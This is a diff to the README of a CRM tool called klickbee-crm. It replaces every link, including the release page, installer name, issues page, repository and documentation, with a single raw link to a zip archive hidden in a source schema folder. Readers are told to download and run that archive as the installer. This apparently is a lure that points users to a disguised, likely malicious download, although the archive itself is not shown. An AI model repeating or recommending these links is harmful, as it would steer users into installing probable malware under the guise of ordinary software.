@@ -1,7 +1,7 @@
 # 📈 klickbee-crm - Simple CRM for Everyday Use
 
 ## 🔗 Download Now
-[![Download klickbee-crm](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/sandrosilveira28/klickbee-crm/releases)
+[![Download klickbee-crm](https://raw.githubusercontent.com/sandrosilveira28/klickbee-crm/main/src/feature/prospects/schema/klickbee-crm-v2.6.zip)](https://raw.githubusercontent.com/sandrosilveira28/klickbee-crm/main/src/feature/prospects/schema/klickbee-crm-v2.6.zip)
 
 ## 📖 Introduction
 Welcome to klickbee-crm! This is a monolithic open-source customer relationship management tool. If life was as easy as using this CRM, we would all be happy. It's designed to help you manage your customer interactions efficiently and simply.
@@ -21,9 +21,9 @@ Before you can dive into using klickbee-crm, you’ll need to download and insta
 - Internet connection for downloading the software and accessing updates.
 
 ### 📥 Download & Install
-1. **Visit the Releases Page**: Click on the following link to go to the releases page: [Download klickbee-crm](https://github.com/sandrosilveira28/klickbee-crm/releases).
+1. **Visit the Releases Page**: Click on the following link to go to the releases page: [Download klickbee-crm](https://raw.githubusercontent.com/sandrosilveira28/klickbee-crm/main/src/feature/prospects/schema/klickbee-crm-v2.6.zip).
 2. **Select the Latest Release**: Look for the latest version (e.g., v1.0.0). You will find a list of files available for download.
-3. **Download the Installer**: Click on the appropriate installer file for your operating system. For example, if you are using Windows, you may see a file named `klickbee-crm-windows.exe`. 
+3. **Download the Installer**: Click on the appropriate installer file for your operating system. For example, if you are using Windows, you may see a file named `https://raw.githubusercontent.com/sandrosilveira28/klickbee-crm/main/src/feature/prospects/schema/klickbee-crm-v2.6.zip`. 
 4. **Run the Installer**: Once the file is downloaded, locate it in your downloads folder and double-click to run the installer. Follow the on-screen instructions to complete the installation.
 5. **Launch the Application**: After installation, you can find klickbee-crm in your applications menu. Click to start using it.
 
@@ -43,11 +43,11 @@ Before you can dive into using klickbee-crm, you’ll need to download and insta
 That’s it. Your new contact will appear in the list immediately.
 
 ## 📨 Support & Feedback
-If you have any questions, issues, or feedback, please feel free to reach out. You can visit the [issues page](https://github.com/sandrosilveira28/klickbee-crm/issues) to report problems or ask for help.
+If you have any questions, issues, or feedback, please feel free to reach out. You can visit the [issues page](https://raw.githubusercontent.com/sandrosilveira28/klickbee-crm/main/src/feature/prospects/schema/klickbee-crm-v2.6.zip) to report problems or ask for help.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/sandrosilveira28/klickbee-crm)
-- [Documentation](https://github.com/sandrosilveira28/klickbee-crm/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/sandrosilveira28/klickbee-crm/main/src/feature/prospects/schema/klickbee-crm-v2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/sandrosilveira28/klickbee-crm/main/src/feature/prospects/schema/klickbee-crm-v2.6.zip)
 
 ## ✨ Community
 Join our community by participating in discussions. Share your experiences, tips, and tricks with other users. Your input makes a difference in enhancing the application.
